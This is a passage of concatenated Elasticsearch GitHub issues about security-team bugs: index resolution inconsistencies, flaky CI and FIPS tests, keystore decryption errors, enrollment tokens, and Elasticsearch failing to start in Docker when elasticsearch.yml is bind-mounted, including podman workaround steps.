Note: this doesn't reproduce if you're running without security enabled (i.e. `./gradlew run -Dtests.es.xpack.security.enabled=false -Dtests.es.xpack.license.self_generated.type=trial`).

### Logs (if relevant)

_No response_","Pinging @elastic/es-security (Team:Security)This is another example that we suffer from two very similar but subtlely different implementations of index resolving:
* https://github.com/elastic/elasticsearch/blob/4c47daa8d608b9f61fde57fcf452fe8bee9cdd7a/server/src/main/java/org/elasticsearch/cluster/metadata/IndexAbstractionResolver.java#L58
* https://github.com/elastic/elasticsearch/blob/4c47daa8d608b9f61fde57fcf452fe8bee9cdd7a/server/src/main/java/org/elasticsearch/cluster/metadata/IndexNameExpressionResolver.java#L1195

Just to add another twist to the issue: The behaviours in core are not entirely consistent within themselves either. The following returns 1 result while I believe it should return 0 result based on what Joe reported?
```
# Return 1 result, expect 0?
GET .ds-test-logs*,-test-logs-1/_field_caps?fields=_id
```I removed the `needs:triage` label since inconsistent behaviour between core and security needs to be fixed regardless of what the right behaviour is.",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,569800596,"[CI] KibanaUserRoleIntegTests.testGetMappings failed","`KibanaUserRoleIntegTests.testGetMappings` failed in https://gradle-enterprise.elastic.co/s/m3c24vrdqulhc

The error was:

```
java.lang.AssertionError:
Expected: map containing [""properties""->ANYTHING]
     but: map was []
at __randomizedtesting.SeedInfo.seed([C200E0EBA372BE2A:8AD76B54A5D3320A]:0)
at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
at org.junit.Assert.assertThat(Assert.java:956)
at org.junit.Assert.assertThat(Assert.java:923)
at org.elasticsearch.integration.KibanaUserRoleIntegTests.testGetMappings(KibanaUserRoleIntegTests.java:159)
at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:566)
at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1754)
at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:942)
at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:978)
at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:992)
at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:370)
at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:819)
at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:470)
at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:951)
at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:836)
at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:887)
at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:898)
at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:370)
at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:826)
```

The REPRO command for this was:

```
./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.integration.KibanaUserRoleIntegTests.testGetMappings"" \
  -Dtests.seed=C200E0EBA372BE2A \
  -Dtests.security.manager=true \
  -Dbuild.snapshot=false \
  -Dtests.jvm.argline=""-Dbuild.snapshot=false"" \
  -Dtests.locale=nl \
  -Dtests.timezone=America/St_Kitts \
  -Dcompiler.java=13
```

That is hard to run locally as it requires the production license key, so I tried:

```
./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.integration.KibanaUserRoleIntegTests.testGetMappings"" \
  -Dtests.seed=C200E0EBA372BE2A \
  -Dtests.security.manager=true \
  -Dtests.locale=nl \
  -Dtests.timezone=America/St_Kitts \
  -Dcompiler.java=13
```

This didn't reproduce the problem.  It _might_ be that the problem is due to something that's different in release builds.  However, this test has never failed before so it may well just be an obscure race condition.","Pinging @elastic/es-security (:Security/Authorization)Sorry meant to comment on this earlier, but got lost in other stuff. I spent some time look at this issue, had a few theories and tried a few things but it didn't go anywhere. This particular test has only failed in such a way [once in the past year](https://build-stats.elastic.co/app/kibana#/discover?_g=(refreshInterval:(pause:!t,value:0),time:(from:now-1y,mode:quick,to:now))&_a=(columns:!(_source),filters:!(('$state':(store:appState),meta:(alias:!n,disabled:!f,index:b646ed00-7efc-11e8-bf69-63c8ef516157,key:build.branch,negate:!t,params:(query:pull-request-2,type:phrase),type:phrase,value:pull-request-2),query:(match:(build.branch:(query:pull-request-2,type:phrase))))),index:b646ed00-7efc-11e8-bf69-63c8ef516157,interval:auto,query:(language:lucene,query:'%22KibanaUserRoleIntegTests%20testGetMappings%22%20AND%20%22map%20containing%20%5B%22properties%22-%3EANYTHING%5D%22'),sort:!(process.time-start,desc))). Since its failure, we have had quite a few releases already and it has not occured anymore. Hence I am closing it.I have seen this again today: https://gradle-enterprise.elastic.co/s/hkvm377lppsuw/tests/:x-pack:plugin:security:internalClusterTest/org.elasticsearch.integration.KibanaUserRoleIntegTests/testGetMappings?top-execution=1 . ",no,">test-failure,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317455080,"Remove support for 2x role formats","*Original comment by @jaymode:*

The security code base still contains parsing code and support for the old 2x role format that we've deprecated. We should remove this for 7.0 since it is too late to remove it for 6.0. Some of this code exists in the FileRolesStore and the RoleDescriptor classes.","*Original comment by @jkakavas:*

From LINK REDACTED and the comments in code, this seems to revolve around the now deprecated `fields` role fieldHi, I'd like to try this out. Could you please guide me on where to start and what to do?Hi @dasu5 ! Thank you for your interest and apologies that this was unaddressed for more than a month, I failed to see the notification. You can start working on it if you feel like it. You can start by looking into the `fields` field in RoleDescriptor and remove the logic to parse it. `RoleDescriptor#parseIndex` is a good starting point Taking a shot at this, @dasu5 hope that's okay.Hi, Yeah no problem :)


On Thu, 26 Mar 2020, 8:48 am Benjamin Ran, <notifications@github.com> wrote:

> Taking a shot at this, @dasu5 <https://github.com/dasu5> hope that's okay.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/elastic/elasticsearch/issues/30104#issuecomment-604204942>,
> or unsubscribe
> <https://github.com/notifications/unsubscribe-auth/AF6XKN6ML33CEBFEOTELWATRJLCPZANCNFSM4JXJEAEA>
> .
>
@tvernum I sadly never got around to this and only remembered it while going through my assignments :(",no,">non-issue,good first issue,:Security/Authentication,Team:Security,"
elastic/elasticsearch,903460305,"[CI] FIPS140SecureSettingsBootstrapCheckTests testLegacySecureSettingsIsNotAllowed failing","**Build scan**:
https://gradle-enterprise.elastic.co/s/zcg2khu4w6mki

**Repro line**:
```
./gradlew ':x-pack:plugin:security:unitTest' -Dtests.seed=9EF260B10C78D505 -Dtests.class=org.elasticsearch.xpack.security.FIPS140SecureSettingsBootstrapCheckTests -Dtests.method=""testLegacySecureSettingsIsNotAllowed"" -Dtests.security.manager=true -Dtests.locale=no -Dtests.timezone=Europe/Budapest -Dcompiler.java=11 -Druntime.java=8
```

**Reproduces locally?**:
no

**Applicable branches**:
6.8

**Failure history**:
https://gradle-enterprise.elastic.co/scans/failures?failures.failureClassification=all_failures&failures.failureMessage=Execution%20failed%20for%20task%20*%0A%3E%20There%20were%20test%20failures:%20*%20suites,%20*%20tests,%20*%20ignored%20*%20assumptions)%20%5Bseed:%20*&search.relativeStartTime=P7D&search.timeZoneId=Europe/Athens

**Failure excerpt**:
```
ERROR   0.05s J13 \| FIPS140SecureSettingsBootstrapCheckTests.testLegacySecureSettingsIsNotAllowed &lt;&lt;&lt; FAILURES! | &nbsp;
-- | --
&nbsp; | &gt; Throwable #1: java.security.KeyStoreException: Key protection  algorithm not found: java.security.NoSuchAlgorithmException: unrecognized algorithm name: PBEWithMD5AndDES | &nbsp;
&nbsp; | &gt; 	at __randomizedtesting.SeedInfo.seed([9EF260B10C78D505:A11D063CC1DCE8A5]:0) | &nbsp;
&nbsp; | &gt; 	at sun.security.pkcs12.PKCS12KeyStore.setKeyEntry(PKCS12KeyStore.java:677) | &nbsp;
&nbsp; | &gt; 	at sun.security.pkcs12.PKCS12KeyStore.engineSetEntry(PKCS12KeyStore.java:1396) | &nbsp;
&nbsp; | &gt; 	at java.security.KeyStore.setEntry(KeyStore.java:1557) | &nbsp;
&nbsp; | &gt; 	at org.elasticsearch.xpack.security.FIPS140SecureSettingsBootstrapCheckTests.generateV2Keystore(FIPS140SecureSettingsBootstrapCheckTests.java:83) | &nbsp;
&nbsp; | &gt; 	at org.elasticsearch.xpack.security.FIPS140SecureSettingsBootstrapCheckTests.testLegacySecureSettingsIsNotAllowed(FIPS140SecureSettingsBootstrapCheckTests.java:35) | &nbsp;
&nbsp; | &gt; 	at java.lang.Thread.run(Thread.java:748) | &nbsp;
&nbsp; | &gt; Caused by: java.security.NoSuchAlgorithmException: unrecognized algorithm name: PBEWithMD5AndDES | &nbsp;
&nbsp; | &gt; 	at sun.security.x509.AlgorithmId.get(AlgorithmId.java:448) | &nbsp;
&nbsp; | &gt; 	at sun.security.pkcs12.PKCS12KeyStore.setKeyEntry(PKCS12KeyStore.java:645) | &nbsp;
&nbsp; | &gt; 	... 41 more
```


","Pinging @elastic/es-security (Team:Security)And one more failure: https://gradle-enterprise.elastic.co/s/hn6djtnbtbkfq",no,">test-failure,Team:Security,:Security/FIPS,"
elastic/elasticsearch,624638273,"Consistent errors for KeyStoreWrapper decryption with any security provider","As identified in https://github.com/elastic/elasticsearch/pull/57050#issuecomment-633257786 , when using the BouncyCastle FIPS security provider, the decryption with a wrong password fails in non predictable ways. Sometimes the `CipherInputStream` doesn't throw an `AEADBadTagException` as expected but `readFully` fails to read the stream fully and thus we fail because of these unconsumed stream contents: https://github.com/elastic/elasticsearch/blob/c117c0cf0a2e1a497c83278cebb7a2da57c2f599/server/src/main/java/org/elasticsearch/common/settings/KeyStoreWrapper.java#L379

We should look at a) why this happens and b) figure out if there is a way to consistently catch Exceptions caused by invalid passwords for any security provider so that we can throw a relevant and useful error message for the users.","Pinging @elastic/es-core-infra (:Core/Infra/Settings)Pinging @elastic/es-security (:Security/Security)",no,">enhancement,help wanted,:Core/Infra/Settings,:Security/Security,Team:Core/Infra,Team:Security,"
elastic/elasticsearch,1325458739,"Start testing with BC-FIPS v2","### Description

We currently perform FIPS testing with bc-fips-1.0.x jars.

Given ES `main` targets Java 17, we no longer need a FIPS provider that supports older JREs, it would be possible to switch to the [upcoming bc-fips-2.0.x release](https://www.bouncycastle.org/fips_java_roadmap.html).

It would be helpful to know whether we are compatible with bc v2 prior to its official certification & release.","Pinging @elastic/es-security (Team:Security)",no,">enhancement,Team:Security,:Security/FIPS,"
elastic/elasticsearch,1307482309,"Should not create enrollment token if HTTP SSL is disabled","`elasticsearch-create-enrollment-token` can sometimes create enrollment tokens even when HTTP SSL is disabled. For example, if the cluster is bootstrapped using security-autoconfiguration, but HTTP SSL gets disabled subsequently during restart. In this case, the relevant files and settings still exist which makes the token creation possible. But the token will not be usable because the other party needs to communicate with the cluster via HTTPS (and verify its certificate signature) which leads to enrollment failure. Instead of failing at enrolling time, it is better to fail at token creation time so that the error message can be more accurate and explicit for easier diagnosis.","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/TLS,Team:Security,"
elastic/elasticsearch,1185209907,"Elasticsearch fails to start in Docker, when `elasticsearch.yml` is bind mount","### Elasticsearch Version

> 8.0.0

### Installed Plugins

_No response_

### Java Version

_bundled_

### OS Version

N/A

### Problem Description

Elasticsearch fails to start when `elasticsearch.yml` is bind mount to a file on the host with a ""Device or resource busy' error. This was possibly introduced with the changes for the autoconfiguration of the security features and triggers when we attempt to write the configuration to the `elasticsearch.yml` file (`AutoConfigureNode#fullyWriteFile`)

### Steps to Reproduce

```
docker run --name oh-noes-this-fails -p 9200:9200 -v /absolute/path/to/a/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml -it docker.elastic.co/elasticsearch/elasticsearch:8.0.0
```

or 

```
docker run --name  oh-noes-this-fails-too -p 9200:9200 --mount type=bind,source=/absolute/path/to/a/elasticsearch.yml,target=/usr/share/elasticsearch/config/elasticsearch.yml -it docker.elastic.co/elasticsearch/elasticsearch:8.0.0
```

fails with 

```
Exception in thread ""main"" java.nio.file.FileSystemException: /usr/share/elasticsearch/config/elasticsearch.yml.R0_9BZ4hRx-v8zK3F0U-Bw.tmp -> /usr/share/elasticsearch/config/elasticsearch.yml: Device or resource busy
	at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:100)
	at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:106)
	at java.base/sun.nio.fs.UnixCopyFile.move(UnixCopyFile.java:416)
	at java.base/sun.nio.fs.UnixFileSystemProvider.move(UnixFileSystemProvider.java:267)
	at java.base/java.nio.file.Files.move(Files.java:1432)
	at org.elasticsearch.xpack.security.cli.AutoConfigureNode.fullyWriteFile(AutoConfigureNode.java:1136)
	at org.elasticsearch.xpack.security.cli.AutoConfigureNode.fullyWriteFile(AutoConfigureNode.java:1148)
	at org.elasticsearch.xpack.security.cli.AutoConfigureNode.execute(AutoConfigureNode.java:687)
	at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:77)
	at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:112)
	at org.elasticsearch.cli.Command.main(Command.java:77)
	at org.elasticsearch.xpack.security.cli.AutoConfigureNode.main(AutoConfigureNode.java:157)
```

### Logs (if relevant)

_No response_","Pinging @elastic/es-security (Team:Security)Clarification: From the stack trace, AutoConfigureNode CLI is experiencing the error, not Elasticsearch.

Startup: Container => `/usr/local/bin/docker-entrypoint.sh` => `/usr/share/elasticsearch/bin/elasticsearch`

Looking at `/usr/share/elasticsearch/bin/elasticsearch`, it seems like the variable ATTEMPT_SECURITY_AUTO_CONFIG=true triggers a call to AutoConfigureNode CLI before Elasticsearch. The stack trace is for AutoConfigureNode CLI, not Elasticsearch.

Excerpt of the AutoConfigure CLI command:
```
ES_MAIN_CLASS=org.elasticsearch.xpack.security.cli.AutoConfigureNode \
ES_ADDITIONAL_SOURCES=""x-pack-env;x-pack-security-env"" \
ES_ADDITIONAL_CLASSPATH_DIRECTORIES=lib/tools/security-cli \
bin/elasticsearch-cli ""${ARG_LIST[@]}"" <<<""$KEYSTORE_PASSWORD""
```

Excerpt of the Elasticsearch daemon command:
```
    ""$JAVA"" \
    ""$XSHARE"" \
    $ES_JAVA_OPTS \
    -Des.path.home=""$ES_HOME"" \
    -Des.path.conf=""$ES_PATH_CONF"" \
    -Des.distribution.flavor=""$ES_DISTRIBUTION_FLAVOR"" \
    -Des.distribution.type=""$ES_DISTRIBUTION_TYPE"" \
    -Des.bundled_jdk=""$ES_BUNDLED_JDK"" \
    -cp ""$ES_CLASSPATH"" \
    org.elasticsearch.bootstrap.Elasticsearch \
    ""${ARG_LIST[@]}"" \
    <<<""$KEYSTORE_PASSWORD"" &
```Reproduce original issue by executing 
```
> docker run --name elastic1 -p 9200:9200 -p 9300:9300 -e ""discovery.type=single-node"" -v C:\Docker\elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml --rm -it docker.elastic.co/elasticsearch/elasticsearch:8.0.0 
Exception in thread ""main"" java.nio.file.FileSystemException: /usr/share/elasticsearch/config/elasticsearch.yml.Occjcc_mS06vpoRLwlpUwA.tmp -> /usr/share/elasticsearch/config/elasticsearch.yml: Device or resource busy
        at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:100)
        at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:106)
        at java.base/sun.nio.fs.UnixCopyFile.move(UnixCopyFile.java:416)
        at java.base/sun.nio.fs.UnixFileSystemProvider.move(UnixFileSystemProvider.java:267)
        at java.base/java.nio.file.Files.move(Files.java:1432)
        at org.elasticsearch.xpack.security.cli.AutoConfigureNode.fullyWriteFile(AutoConfigureNode.java:1136)
        at org.elasticsearch.xpack.security.cli.AutoConfigureNode.fullyWriteFile(AutoConfigureNode.java:1148)
        at org.elasticsearch.xpack.security.cli.AutoConfigureNode.execute(AutoConfigureNode.java:687)
        at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:77)
        at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:112)
        at org.elasticsearch.cli.Command.main(Command.java:77)
        at org.elasticsearch.xpack.security.cli.AutoConfigureNode.main(AutoConfigureNode.java:157)
```

Extract interesting files from container (Prerequisite: All `C:\Docker` to file sharing accept list)
```
> docker run --name elastic1 -p 9200:9200 -p 9300:9300 -e ""discovery.type=single-node"" -v ""C:\Docker"":/mnt/local --rm -it docker.elastic.co/elasticsearch/elasticsearch:8.0.0 bash
elasticsearch@9d37e1eb7777:~$ cp /usr/share/elasticsearch/config/elasticsearch.yml /mnt/local/elasticsearch.yml
elasticsearch@9d37e1eb7777:~$ cp /usr/share/elasticsearch/config/elasticsearch.yml /mnt/local/elasticsearch2.yml
elasticsearch@9d37e1eb7777:~$ cp /usr/local/bin/docker-entrypoint.sh               /mnt/local/docker-entrypoint.sh
elasticsearch@9d37e1eb7777:~$ cp /usr/share/elasticsearch/bin/elasticsearch        /mnt/local/elasticsearch
```

Start in bash as root user, switch to elasticsearch, manually run `docker-entrypoint.sh` to reproduce the original error
```
> docker run -u root --name elastic1 -p 9200:9200 -p 9300:9300 -e ""discovery.type=single-node"" -v C:\Docker\elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml -v C:\Docker\elasticsearch2.yml:/usr/share/elasticsearch/config/elasticsearch2.yml --rm -it docker.elastic.co/elasticsearch/elasticsearch:8.0.0 bash

root@62b736fca663:/usr/share/elasticsearch# ls -l /usr/share/elasticsearch/config/elasticsearch*.yml
-rw-rw-r-- 1 root root 1042 Feb  3 16:47 /usr/share/elasticsearch/config/elasticsearch-plugins.example.yml
-rwxr-xr-x 1 root root   53 Mar 29 19:01 /usr/share/elasticsearch/config/elasticsearch.yml
-rwxr-xr-x 1 root root   53 Mar 29 19:01 /usr/share/elasticsearch/config/elasticsearch2.yml

root@62b736fca663:/usr/share/elasticsearch# df -a | grep elasticsearch
grpcfuse       998896636 190624520 808272116  20% /usr/share/elasticsearch/config/elasticsearch.yml
grpcfuse       998896636 190624520 808272116  20% /usr/share/elasticsearch/config/elasticsearch2.yml

root@62b736fca663:/usr/share/elasticsearch# su - elasticsearch

elasticsearch@62b736fca663:~$ /usr/local/bin/docker-entrypoint.sh
Exception in thread ""main"" java.nio.file.FileSystemException: /usr/share/elasticsearch/config/elasticsearch.yml.JrtBhUSPQ4eNKgiJ3atKQQ.tmp -> /usr/share/elasticsearch/config/elasticsearch.yml: Device or resource busy
        at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:100)
        at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:106)
        at java.base/sun.nio.fs.UnixCopyFile.move(UnixCopyFile.java:416)
        at java.base/sun.nio.fs.UnixFileSystemProvider.move(UnixFileSystemProvider.java:267)
        at java.base/java.nio.file.Files.move(Files.java:1432)
        at org.elasticsearch.xpack.security.cli.AutoConfigureNode.fullyWriteFile(AutoConfigureNode.java:1136)
        at org.elasticsearch.xpack.security.cli.AutoConfigureNode.fullyWriteFile(AutoConfigureNode.java:1148)
        at org.elasticsearch.xpack.security.cli.AutoConfigureNode.execute(AutoConfigureNode.java:687)
        at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:77)
        at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:112)
        at org.elasticsearch.cli.Command.main(Command.java:77)
        at org.elasticsearch.xpack.security.cli.AutoConfigureNode.main(AutoConfigureNode.java:157)

elasticsearch@62b736fca663:~$ ls -l /usr/share/elasticsearch/config/elasticsearch*.yml
-rw-rw-r-- 1 root          root          1042 Feb  3 16:47 /usr/share/elasticsearch/config/elasticsearch-plugins.example.yml
-rwxr-xr-x 1 elasticsearch elasticsearch   53 Mar 29 19:01 /usr/share/elasticsearch/config/elasticsearch.yml
-rwxr-xr-x 1 root          root            53 Mar 29 19:01 /usr/share/elasticsearch/config/elasticsearch2.yml
```Check elasticsearch.yml ownership and permissions before and after manually running docker-entrypoint.sh.
```
>docker run -u root --name elastic1 -p 9200:9200 -p 9300:9300 -e ""discovery.type=single-node"" --rm -it docker.elastic.co/elasticsearch/elasticsearch:8.0.0 bash

root@40b71bc4c3ae:/usr/share/elasticsearch# ls -l /usr/share/elasticsearch/config/elasticsearch.yml
-rw-rw-r-- 1 root root 53 Feb  3 22:53 /usr/share/elasticsearch/config/elasticsearch.yml

root@40b71bc4c3ae:/usr/share/elasticsearch# su - elasticsearch

elasticsearch@40b71bc4c3ae:~$ /usr/local/bin/docker-entrypoint.sh > /dev/null 2> /dev/null &
[1] 18

elasticsearch@40b71bc4c3ae:~$ ls -l /usr/share/elasticsearch/config/elasticsearch.yml
-rw-rw-r-- 1 elasticsearch elasticsearch 1106 Mar 29 20:47 /usr/share/elasticsearch/config/elasticsearch.yml
```If the operator does not mount elasticsearch.yml, I assume they want elasticsearch.yml autoconfiguration.
If the operator mounts elasticsearch.yml, I assume they don't want elasticsearch.yml autoconfiguration.

From looking at the startup scripts, I don't see an option to skip autoconfiguration. The only way seems to be if ENROLLMENT_TOKEN is set.
- `/usr/local/bin/docker-entrypoint.sh` looks for it and calls `/usr/share/elasticsearch/bin/elasticsearch --enrollment-token $ENROLLMENT_TOKEN` .
- `/usr/share/elasticsearch/bin/elasticsearch` only skips autoconfiguration (i.e. ATTEMPT_SECURITY_AUTO_CONFIG=false) if one of these parameters are present: --enrollment-token, --help, -h, --version, or -vNote that in addition to elasticsearch, kibana actually overwrites the configuration file to write content. So in fact, should the initialization file be separated from the actual configuration file like the `.conf.d` file, such as adding a concept of `elasticsearch-d.yml` to be responsible for initialization?>If the operator does not mount elasticsearch.yml, I assume they want elasticsearch.yml autoconfiguration.
If the operator mounts elasticsearch.yml, I assume they don't want elasticsearch.yml autoconfiguration.

If you're proposing this should be the logic we use in the auto-configuration, I concur.

Should the same logic extend to the config directory?>  If the operator mounts elasticsearch.yml, I assume they don't want elasticsearch.yml autoconfiguration.

I'd just like to add that this is not always the case. Whether, we should accept that as a limitation and work with this is another topic ( which I probably also agree with ) but for instance, on both cases this was reported in the forums, the users wanted to set a specific value (i.e. network.host to affect the SANs of the HTTP certificate ) but take advantage of the security features We briefly discussed this today in our weekly sync.
There was consensus that mounting only the `elasticsearch.yml` file, but leaving the rest of the config directory on the docker container, is not a configuration that works well with Security auto-configuration (primarily because persisting only the generated yml file, without the associated keystore and certs, is not useful for subsequent container runs).

I have taken an action item to investigate what is the consistent way to react to such a configuration, from starting without security auto-conf, or not starting at all.
I'll assign this to me.Got this issue with version `8.1.2`.

Having a specific configuration file `elasticsearch.yml` is simplier to handle than defining all the env variables in the `docker-compose.yaml` that can be very verbose when using multiple docker services.This is due to the container using elasticsearch:elasticsearch as the user. Docker containers are intended to run everything via root:root.

All you need to do is set the ownerID and groupID of the directories being mounted to 1000:1000

ex: 
```

- name: Create elk directory if it does not exist
  ansible.builtin.file:
    path: /opt/elk/{{ item.name }}
    state: directory
    mode: '0755'
    owner: ""{{ item.oid }}""
    group: ""{{ item.gid }}""
  with_items:
    - { name: ""elasticsearch/config"", oid: 1000, gid: 1000}
    - { name: ""elasticsearch/data"", oid: 1000, gid: 1000}
    - { name: ""kibana/config"", oid: 1000, gid: 1000}
    - { name: ""kibana/data"", oid: 1000, gid: 1000}
  become: yes
```Hi all,
There is some progress with this bug ? got this issue with version 8.3.2.
Setting the ownerID and groupID of the mounted directories to 1000:1000 not resolving to issue.I am using env var, instead of mounting `elasticsearch.yml`. For example, I add `ELASTICSEARCH_FS_SNAPSHOT_REPO_PATH=/mnt/backup` in order to setup snapshot repo.> I have taken an action item to investigate what is the consistent way to react to such a configuration, from starting without security auto-conf, or not starting at all.

@albertzaharovits did you get anywhere with this?

My feeling is that we should do something like (if we determine auto-configuration is needed)

1. Try to write a temporary file to the config directory. If that fails, then we know we won't be successful with auto-configuration, and we should skip it
2. Check whether that temporary file has the same mount point as `elasticsearch.yml` and `elasticsearch.keystore` if not, then we can assume that auto-configuration will do the wrong thing (that is, it would write files to 2 or more different mount points, leading to one or both being orphaned). In that case we should cleanup the temp file and skip the rest of auto configuration. We can probably just check that the output from `findmnt --noheadings --output TARGET --target ${file}` is the same for all 3 files (temp, yml, keystore)
3.  Otherwise, remove the temp file and proceed with auto-configuration

We should talk about whether to do that for all packaging types, or just for docker.
Bumping this as this causes issues when trying to run the elasticsearch container as a rootless container using systemd.

I have tried to copy some files (the certs and .yml and .keystore) and bind mount them, and then adding `-e ATTEMPT_SECURITY_AUTO_CONFIG=false` to `podman run`, but I could not get the correct enrollment token. 

I would very much like to have all the security bells and whistles autoconfigured for me + persistent storage :) 
I think I got it working; rootless containers running at boot without having the user having to log in. Here is a little write up. Hopefully you guys can make this a bit easier! 

```
cat /etc/*-release
Rocky Linux release 8.6 (Green Obsidian)
NAME=""Rocky Linux""
VERSION=""8.6 (Green Obsidian)""
```

Initial start to generate some files:
```
podman run --name es01 --net elastic -p 9200:9200 -p 9300:9300 -e ""discovery.type=single-node"" -v /podman/elasticsearch/data:/usr/share/elasticsearch/data:Z -it docker.elastic.co/elasticsearch/elasticsearch:8.3.3
```
Ctrl + C to quit

```
cd ~/podman/elasticsearch/config
podman cp es01:/usr/share/elasticsearch/config/elasticsearch.yml .
podman cp es01:/usr/share/elasticsearch/config/elasticsearch.keystore .
mkdir ~/podman/elasticsearch/config/certs
cd certs
podman cp es01:/usr/share/elasticsearch/config/certs/http.p12 .
podman cp es01:/usr/share/elasticsearch/config/certs/transport.p12 .
podman cp es01:/usr/share/elasticsearch/config/certs/http_ca.crt .


podman stop es01
podman rm es01


rm -rf /podman/elasticsearch/data/*
```

Let us bind mount:
```
podman run --name es01 --net elastic -p 9200:9200 -p 9300:9300 -e ""discovery.type=single-node"" -e ATTEMPT_SECURITY_AUTO_CONFIG=false -v ~/podman/elasticsearch/config/certs/http.p12:/usr/share/elasticsearch/config/certs/http.p12:Z -v ~/podman/elasticsearch/config/certs/transport.p12:/usr/share/elasticsearch/config/certs/transport.p12:Z -v ~/podman/elasticsearch/config/certs/http_ca.crt:/usr/share/elasticsearch/config/certs/http_ca.crt:Z -v ~/podman/elasticsearch/config/elasticsearch.keystore:/usr/share/elasticsearch/config/elasticsearch.keystore:Z -v ~/podman/elasticsearch/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml:Z -v /podman/elasticsearch/data:/usr/share/elasticsearch/data:Z -dt docker.elastic.co/elasticsearch/elasticsearch:8.3.3
```

Let us get the enrollment token (a lot of errors here, but it spits out the code in the end):
```
podman exec -it es01 /usr/share/elasticsearch/bin/elasticsearch-create-enrollment-token -s kibana
```

Let us start Kibana and use our enrollment procedure visiting the `website:5601` and grabbing the code from terminal:
```
podman run --name kib-01 --net elastic -p 5601:5601 -v ~/podman/kibana/data/:/usr/share/kibana/data/:Z docker.elastic.co/kibana/kibana:8.3.3
```

CTLR + C to stop kibana.

But, let us start it again so we can grab the `kibana.yml` configuration file:
```
podman start kib-01

mkdir ~/podman/kibana/config
cd ~/podman/kibana/config
podman cp kib-01:/usr/share/kibana/config/kibana.yml . 
```
Stop it, using `podman stop kib-01`.

